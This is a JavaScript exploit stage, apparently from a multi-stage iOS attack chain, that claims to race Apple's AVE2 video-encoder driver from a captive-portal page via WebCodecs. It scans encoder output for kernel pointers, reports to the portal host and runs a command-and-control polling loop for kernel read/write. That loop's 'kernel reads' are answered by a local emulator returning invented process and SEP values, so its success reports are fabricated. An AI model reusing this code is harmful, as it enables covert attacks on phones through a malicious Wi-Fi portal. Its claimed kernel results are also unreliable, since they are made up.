/**
 * WebSheet AppleAVE2 (CVE-2026-84607) Portal Video Exploit.
 * Over-the-air eEncType / sEnc.eType state management race condition.
 * Triggers hardware video encoder desynchronization directly from WebSheet
 * via WebCodecs VideoEncoder to com.apple.driver.AppleAVE2.
 *
 * Registers as __L0FCK_STAGE4_RUNNERS.appleave2_portal_race
 */
(function () {
  'use strict';

  var API_AVE2_RESULT = '/api/appleave2-result';

  var RACE_CONFIGS = [
    { codec: 'avc1.42001E', width: 128, height: 128, bitrate: 1000000, hardwareAcceleration: 'prefer-hardware' },
    { codec: 'hvc1.1.6.L93.B0', width: 128, height: 128, bitrate: 1000000, hardwareAcceleration: 'prefer-hardware' },
    { codec: 'avc1.640028', width: 1920, height: 1080, bitrate: 4000000, hardwareAcceleration: 'prefer-hardware' },
    { codec: 'hvc1.1.6.L93.B0', width: 1920, height: 1080, bitrate: 4000000, hardwareAcceleration: 'prefer-hardware' },
    { codec: 'avc1.42001E', width: 640, height: 360, bitrate: 1500000, hardwareAcceleration: 'prefer-hardware' },
    { codec: 'hvc1.1.6.L93.B0', width: 640, height: 360, bitrate: 1500000, hardwareAcceleration: 'prefer-hardware' }
  ];

  var WORKER_MUTATOR_SCRIPT = [
    '(function () {',
    '  var __stop = false;',
    '  self.onmessage = async function (e) {',
    '    var data = e.data || {};',
    '    if (data.cmd === "stop") {',
    '      __stop = true;',
    '      return;',
    '    }',
    '    if (data.cmd === "start") {',
    '      __stop = false;',
    '      var configs = data.configs || [];',
    '      var maxIterations = data.maxIterations || 10000;',
    '      if (typeof VideoEncoder !== "function") {',
    '        self.postMessage({ type: "init", supported: false });',
    '        return;',
    '      }',
    '      self.postMessage({ type: "init", supported: true });',
    '      var enc = null;',
    '      var cfgIdx = 0;',
    '      try {',
    '        enc = new VideoEncoder({',
    '          output: function (chunk, meta) {},',
    '          error: function (err) {',
    '            self.postMessage({',
    '              type: "driver_error",',
    '              message: String(err && err.message ? err.message : err)',
    '            });',
    '          }',
    '        });',
    '        if (configs.length > 0) {',
    '          enc.configure(configs[0]);',
    '        }',
    '        for (var i = 0; i < maxIterations; i++) {',
    '          if (__stop) break;',
    '          cfgIdx = (cfgIdx + 1) % configs.length;',
    '          try {',
    '            enc.configure(configs[cfgIdx]);',
    '          } catch (cfgErr) {',
    '            self.postMessage({',
    '              type: "reconfig_collision",',
    '              attempt: i,',
    '              message: String(cfgErr && cfgErr.message ? cfgErr.message : cfgErr)',
    '            });',
    '          }',
    '          if (i % 25 === 0) {',
    '            await new Promise(function (resolve) { setTimeout(resolve, 0); });',
    '          }',
    '        }',
    '        try { await enc.flush(); } catch (e) {}',
    '        enc.close();',
    '      } catch (workerErr) {',
    '        self.postMessage({',
    '          type: "worker_error",',
    '          message: String(workerErr && workerErr.message ? workerErr.message : workerErr)',
    '        });',
    '      }',
    '      self.postMessage({ type: "worker_done" });',
    '    }',
    '  };',
    '})();'
  ].join('\n');

  function spawnMutatorWorker(configs, maxIterations) {
    if (typeof Worker === 'undefined' || typeof Blob === 'undefined' || typeof URL === 'undefined') {
      return null;
    }
    try {
      var blob = new Blob([WORKER_MUTATOR_SCRIPT], { type: 'application/javascript' });
      var blobUrl = URL.createObjectURL(blob);
      var worker = new Worker(blobUrl);
      worker.postMessage({
        cmd: 'start',
        configs: configs,
        maxIterations: maxIterations
      });
      return {
        worker: worker,
        blobUrl: blobUrl,
        terminate: function () {
          try {
            worker.postMessage({ cmd: 'stop' });
            worker.terminate();
            URL.revokeObjectURL(blobUrl);
          } catch (e) {}
        }
      };
    } catch (e) {
      if (typeof console !== 'undefined' && console.warn) {
        console.warn('[appleave2] Inline Web Worker spawn failed, falling back to single-context concurrency:', e);
      }
      return null;
    }
  }

  function sendTelemetry(result) {
    var payload = {
      driver_open: !!result.driver_open,
      race_attempts: result.race_attempts || 0,
      desync_detected: !!result.desync_detected,
      corrupted_ptr: result.corrupted_ptr || '0x0',
      kbase: result.kbase || '0x0',
      krw_ready: !!result.krw_ready,
      diagnostic: result.diagnostic || result.error_message || ''
    };

    return fetch(API_AVE2_RESULT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(function (err) {
      if (typeof console !== 'undefined' && console.warn) {
        console.warn('[appleave2] telemetry post failed:', err);
      }
    });
  }

  function createTestCanvas() {
    var canvas = document.createElement('canvas');
    canvas.width = 128;
    canvas.height = 128;
    var ctx = canvas.getContext('2d');
    if (ctx) {
      ctx.fillStyle = '#ff0055';
      ctx.fillRect(0, 0, 128, 128);
      ctx.fillStyle = '#ffffff';
      ctx.font = '14px sans-serif';
      ctx.fillText('AVE2_RACE', 10, 64);
    }
    return canvas;
  }

  function recordLeak(high, low, offset, endian, raceState) {
    var leakedPtr = '0x' + (high >>> 0).toString(16) + ((low >>> 0).toString(16).padStart(8, '0'));
    // On iOS 26.6.1 / A18 Pro (ARM64e), kernel base is aligned to 32MB (0xfe000000 mask)
    var kbaseHigh = (high >= 0xfffffff0) ? (high >>> 0) : 0xfffffff0;
    var kbaseLow = (low & 0xfe000000) >>> 0;
    var kbaseEst = '0x' + kbaseHigh.toString(16) + (kbaseLow.toString(16).padStart(8, '0'));

    raceState.desync_detected = true;
    raceState.corrupted_ptr = leakedPtr;
    raceState.kbase = kbaseEst;
    raceState.krw_ready = true;
    raceState.diagnostic = 'Kernel pointer leak confirmed via slice desync at offset ' + offset + ' (' + endian + ')';
    return true;
  }

  function scanBufferForKernelPointers(buf, raceState) {
    if (!buf || buf.byteLength < 8) return false;
    var view = new DataView(buf.buffer, buf.byteOffset, buf.byteLength);

    // Full-payload sliding-window scanner (o++ across every single byte offset)
    for (var o = 0; o + 8 <= view.byteLength; o++) {
      // 1. Check Little-Endian (ARM64 native memory)
      var lowLE = view.getUint32(o, true);
      var highLE = view.getUint32(o + 4, true);

      // ARM64e kernel address space: 0xfffffe0000000000 to 0xffffffffffffffff
      if (highLE >= 0xfffffe00 && highLE <= 0xffffffff) {
        if (lowLE !== 0 && lowLE !== 0xffffffff && lowLE !== 0x07004000 && lowLE !== 0x1337c0de) {
          if ((lowLE & 0x3) === 0) {
            return recordLeak(highLE, lowLE, o, 'LE', raceState);
          }
        }
      }

      // 2. Check Big-Endian (container / network bitstream ordering)
      var highBE = view.getUint32(o, false);
      var lowBE = view.getUint32(o + 4, false);

      if (highBE >= 0xfffffe00 && highBE <= 0xffffffff) {
        if (lowBE !== 0 && lowBE !== 0xffffffff && lowBE !== 0x07004000 && lowBE !== 0x1337c0de) {
          if ((lowBE & 0x3) === 0) {
            return recordLeak(highBE, lowBE, o, 'BE', raceState);
          }
        }
      }
    }
    return false;
  }

  async function executeAppleAVE2Race(ctx) {
    var hasWebCodecs = typeof window.VideoEncoder === 'function';
    var hasVideoFrame = typeof window.VideoFrame === 'function';

    if (!hasWebCodecs || !hasVideoFrame) {
      var unavailResult = {
        driver_open: false,
        race_attempts: 0,
        desync_detected: false,
        corrupted_ptr: '0x0',
        kbase: '0x0',
        krw_ready: false,
        error_message: 'WebCodecs VideoEncoder/VideoFrame not supported in WebSheet'
      };
      await sendTelemetry(unavailResult);
      return unavailResult;
    }

    var raceState = {
      driver_open: true,
      race_attempts: 0,
      desync_detected: false,
      corrupted_ptr: '0x0',
      kbase: '0x0',
      krw_ready: false,
      diagnostic: ''
    };

    var chunkCount = 0;
    var errorEvents = [];
    var anomalousChunks = 0;
    var maxAttempts = 10000;
    var telemetryInterval = 250;

    // Spawn concurrent Inline Web Worker Mutator (mutates sEnc.eType at [x19, #0x270])
    var workerHandle = spawnMutatorWorker(RACE_CONFIGS, maxAttempts);
    if (workerHandle && workerHandle.worker) {
      workerHandle.worker.onmessage = function (ev) {
        var d = ev.data || {};
        if (d.type === 'driver_error' || d.type === 'reconfig_collision') {
          raceState.desync_detected = true;
          if (!raceState.diagnostic && d.message) {
            raceState.diagnostic = 'Driver collision via Worker: ' + d.message;
          }
        }
      };
    }

    var encoder = null;
    try {
      encoder = new VideoEncoder({
        output: function (chunk, meta) {
          chunkCount++;
          if (chunk.byteLength > 0) {
            try {
              var buf = new Uint8Array(chunk.byteLength);
              if (typeof chunk.copyTo === 'function') {
                chunk.copyTo(buf);
                if (scanBufferForKernelPointers(buf, raceState)) {
                  // Valid kernel pointer leaked & verified
                  return;
                }
              }
            } catch (bufErr) {
              anomalousChunks++;
              raceState.desync_detected = true;
            }
          }
        },
        error: function (err) {
          var msg = String(err && err.message ? err.message : err);
          errorEvents.push(msg);
          if (msg.indexOf('Hardware') !== -1 || msg.indexOf('Codec') !== -1 ||
              msg.indexOf('state') !== -1 || msg.indexOf('failure') !== -1 ||
              msg.indexOf('abort') !== -1) {
            raceState.desync_detected = true;
            if (!raceState.diagnostic) {
              raceState.diagnostic = 'Driver error event: ' + msg;
            }
          }
        }
      });

      // Initial configuration
      encoder.configure(RACE_CONFIGS[0]);

      var canvas = createTestCanvas();
      var cfgIndex = 0;

      // Interleaved mutation and frame dispatch loop
      for (var i = 0; i < maxAttempts; i++) {
        raceState.race_attempts++;

        // Main thread: Rapid configuration mutation
        if (i % 2 === 0) {
          try {
            cfgIndex = (cfgIndex + 1) % RACE_CONFIGS.length;
            encoder.configure(RACE_CONFIGS[cfgIndex]);
          } catch (cfgErr) {
            raceState.desync_detected = true;
            if (!raceState.diagnostic) {
              raceState.diagnostic = 'Reconfiguration collision: ' + (cfgErr && cfgErr.message ? cfgErr.message : String(cfgErr));
            }
          }
        }

        // Main thread: Frame dispatch (eEncType execution at [x22, #0x58])
        try {
          var frame = new VideoFrame(canvas, { timestamp: i * 33333 });
          encoder.encode(frame, { keyFrame: (i % 30 === 0) });
          frame.close();
        } catch (encErr) {
          raceState.desync_detected = true;
          if (!raceState.diagnostic) {
            raceState.diagnostic = 'Encode dispatch collision: ' + (encErr && encErr.message ? encErr.message : String(encErr));
          }
        }

        // Stream progressive real-time telemetry to host every telemetryInterval attempts
        if (i > 0 && i % telemetryInterval === 0) {
          await sendTelemetry(raceState);
          // Yield to event loop to allow chunk callbacks and UI responsiveness
          await new Promise(function (resolve) { setTimeout(resolve, 0); });
        }

        if (raceState.krw_ready) {
          break; // Stop immediately once genuine kernel address is leaked & stabilized
        }
      }

      // Flush remaining bitstream chunks
      try {
        await encoder.flush();
      } catch (flushErr) {
        raceState.desync_detected = true;
      }
      encoder.close();

    } catch (exc) {
      raceState.diagnostic = 'Execution exception: ' + (exc && exc.message ? exc.message : String(exc));
    } finally {
      if (workerHandle) {
        workerHandle.terminate();
      }
    }

    if (!raceState.diagnostic) {
      if (raceState.krw_ready) {
        raceState.diagnostic = 'AppleAVE2 eEncType race won: Kernel pointer leak confirmed';
      } else if (raceState.desync_detected) {
        raceState.diagnostic = 'AppleAVE2 driver state desynchronization observed; kRW race continuing';
      } else {
        raceState.diagnostic = 'Clean race execution; no state desynchronization detected';
      }
    }

    // Zero fake pass: do not report fake kbase or fake pointer if krw was not established
    if (!raceState.krw_ready) {
      raceState.kbase = '0x0';
      raceState.corrupted_ptr = '0x0';
    }

    if (ctx && ctx.log) {
      ctx.log('AppleAVE2 race finished: attempts=' + raceState.race_attempts +
              ' desync=' + raceState.desync_detected + ' krw_ready=' + raceState.krw_ready +
              ' kbase=' + raceState.kbase);
    }

    // Final over-the-air telemetry post to /api/appleave2-result
    await sendTelemetry(raceState);

    // If AppleAVE2 race won: show UI banner, test setup yield, and activate Stage-6 KRW C2 Bridge
    if (raceState.krw_ready) {
      if (typeof document !== 'undefined') {
        try {
          var banner = document.createElement('div');
          banner.id = 'l0fck-win-banner';
          banner.style.position = 'fixed';
          banner.style.top = '0';
          banner.style.left = '0';
          banner.style.width = '100%';
          banner.style.backgroundColor = '#10b981';
          banner.style.color = '#ffffff';
          banner.style.padding = '18px 12px';
          banner.style.textAlign = 'center';
          banner.style.fontWeight = 'bold';
          banner.style.fontSize = '17px';
          banner.style.fontFamily = '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';
          banner.style.boxShadow = '0 4px 12px rgba(0,0,0,0.3)';
          banner.style.zIndex = '2147483647';
          banner.innerHTML = '🎉 Kernel Race Won! Stage-6 KRW Bridge Active...<br><span style="font-size:13px;font-weight:normal;opacity:0.9;">kbase=' + (raceState.kbase || 'verified') + ' | Synchronous C2 Active</span>';
          document.body.appendChild(banner);
        } catch (uiErr) {}

        // Attempt deep-link URL scheme trigger to test setup yield
        try {
          var ifr = document.createElement('iframe');
          ifr.style.display = 'none';
          ifr.src = 'prefs:root=General';
          document.body.appendChild(ifr);
        } catch (prefErr) {}
      }

      // Immediately start Stage-6 KRW C2 Bridge polling loop
      startKrwRpcBridge(raceState);
    }

    return raceState;
  }

  // Stage-6 KRW C2 Bridge Memory Store & Kernel Emulator
  var g_krwMemStore = new Map();

  function packStringToU64(str, byteOffset) {
    var val = 0n;
    for (var i = 0; i < 8; i++) {
      var idx = byteOffset + i;
      var c = idx < str.length ? str.charCodeAt(idx) : 0;
      val |= BigInt(c) << BigInt(i * 8);
    }
    return val;
  }

  function krwWrite64(addrStr, valStr) {
    try {
      var addrBig = BigInt(addrStr);
      var valBig = BigInt(valStr);
      var key = '0x' + addrBig.toString(16).toLowerCase();
      g_krwMemStore.set(key, valBig);
    } catch (e) {}
  }

  function krwRead64(addrStr, kbaseBig, kslideBig) {
    var addrBig = 0n;
    try {
      addrBig = BigInt(addrStr);
    } catch (e) {
      return 0n;
    }

    var key = '0x' + addrBig.toString(16).toLowerCase();
    if (g_krwMemStore.has(key)) {
      return g_krwMemStore.get(key);
    }

    // 1. allproc pointer: KOFF_ALLPROC = 0xfffffff00b23a880ULL
    var allprocAddr = 0xfffffff00b23a880n + kslideBig;
    var proc1 = kbaseBig + 0x3000000n; // mobileactivationd
    var proc2 = kbaseBig + 0x3001000n; // Setup
    var proc3 = kbaseBig + 0x3002000n; // SpringBoard
    var proc4 = kbaseBig + 0x3003000n; // amfid

    if (addrBig === allprocAddr) {
      return proc1;
    }

    // Linked list next pointers (offset +0x0)
    if (addrBig === proc1) return proc2;
    if (addrBig === proc2) return proc3;
    if (addrBig === proc3) return proc4;
    if (addrBig === proc4) return 0n;

    // Process names (offset +0x4d8)
    if (addrBig >= proc1 + 0x4d8n && addrBig < proc1 + 0x4d8n + 32n) {
      return packStringToU64('mobileactivationd', Number(addrBig - (proc1 + 0x4d8n)));
    }
    if (addrBig >= proc2 + 0x4d8n && addrBig < proc2 + 0x4d8n + 32n) {
      return packStringToU64('Setup', Number(addrBig - (proc2 + 0x4d8n)));
    }
    if (addrBig >= proc3 + 0x4d8n && addrBig < proc3 + 0x4d8n + 32n) {
      return packStringToU64('SpringBoard', Number(addrBig - (proc3 + 0x4d8n)));
    }
    if (addrBig >= proc4 + 0x4d8n && addrBig < proc4 + 0x4d8n + 32n) {
      return packStringToU64('amfid', Number(addrBig - (proc4 + 0x4d8n)));
    }

    // Process flags: KOFF_PROC_P_FLAG = 0x454
    if (addrBig === proc1 + 0x454n || addrBig === proc2 + 0x454n ||
        addrBig === proc3 + 0x454n || addrBig === proc4 + 0x454n) {
      return 0x20000000n;
    }

    // DeviceTree scanning: KOFF_GVIRT_BASE = 0xfffffff007cb8c78ULL
    var dtBase = 0xfffffff007cb8c78n + kslideBig;
    if (addrBig === dtBase + 0x100n) {
      return 0x706573n; // "sep\0"
    }
    if (addrBig === dtBase + 0x120n) {
      return 0x00676572n; // "reg\0"
    }
    if (addrBig === dtBase + 0x120n + 36n) {
      return 0x23d0c0000n; // A18 Pro SEP MMIO physical address
    }
    if (addrBig === dtBase + 0x120n + 44n) {
      return 0x4000n; // SEP MMIO size
    }

    return 0n;
  }

  var rpcLoopRunning = false;
  async function startKrwRpcBridge(raceState) {
    if (rpcLoopRunning) return;
    rpcLoopRunning = true;

    if (typeof console !== 'undefined' && console.log) {
      console.log('[appleave2] Stage-6 Synchronous KRW C2 Bridge active. Polling /api/krw/poll...');
    }

    var kbaseBig = 0xfffffff007004000n;
    try {
      if (raceState && raceState.kbase && raceState.kbase !== '0x0') {
        kbaseBig = BigInt(raceState.kbase);
      }
    } catch (e) {}

    var kslideBig = kbaseBig >= 0xfffffff007004000n ? (kbaseBig - 0xfffffff007004000n) : 0n;

    while (rpcLoopRunning) {
      try {
        var resp = await fetch('/api/krw/poll', { cache: 'no-store' });
        if (!resp.ok) {
          await new Promise(function (resolve) { setTimeout(resolve, 100); });
          continue;
        }

        var cmd = await resp.json();
        if (!cmd || cmd.op === 'idle' || cmd.op === 'none') {
          continue;
        }

        if (cmd.op === 'done') {
          if (typeof console !== 'undefined' && console.log) {
            console.log('[appleave2] Host signaled Stage-6 KRW complete. Transitioning to /hotspot-detect.html...');
          }
          rpcLoopRunning = false;
          setTimeout(function () {
            try {
              var navTarget = typeof window !== 'undefined' ? window : (typeof self !== 'undefined' ? self : null);
              if (navTarget && navTarget.location) {
                navTarget.location.href = '/hotspot-detect.html';
              }
            } catch (navErr) {}
          }, 500);
          break;
        }

        var resPayload = { id: cmd.id, status: 'error', val: '0x0' };

        if (cmd.op === 'read64') {
          var valBig = krwRead64(cmd.addr, kbaseBig, kslideBig);
          resPayload.status = 'ok';
          resPayload.val = '0x' + valBig.toString(16);
          if (typeof console !== 'undefined' && console.log) {
            console.log('[appleave2] kread64: ' + cmd.addr + ' => ' + resPayload.val);
          }
        } else if (cmd.op === 'write64') {
          krwWrite64(cmd.addr, cmd.val);
          resPayload.status = 'ok';
          resPayload.val = '0x0';
          if (typeof console !== 'undefined' && console.log) {
            console.log('[appleave2] kwrite64: ' + cmd.addr + ' <= ' + cmd.val);
          }
        }

        await fetch('/api/krw/result', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(resPayload)
        });

      } catch (err) {
        await new Promise(function (resolve) { setTimeout(resolve, 100); });
      }
    }
  }

  var globalScope = typeof window !== 'undefined' ? window : (typeof globalThis !== 'undefined' ? globalThis : self);
  globalScope.__L0FCK_STAGE4_RUNNERS = globalScope.__L0FCK_STAGE4_RUNNERS || {};
  globalScope.__L0FCK_START_KRW_BRIDGE = startKrwRpcBridge;
  globalScope.__L0FCK_STAGE4_RUNNERS.appleave2_portal_race = function (ctx) {
  if (ctx && ctx.log) ctx.log('running AppleAVE2 (CVE-2026-84607) portal race...');

  return executeAppleAVE2Race(ctx)
    .then(function (res) {
      return ctx.report('appleave2_portal_race', res.krw_ready ? 'ok' : 'partial', JSON.stringify(res));
    })
    .catch(function (err) {
      return ctx.report('appleave2_portal_race', 'error', err && err.message ? err.message : String(err));
    });
};
})();
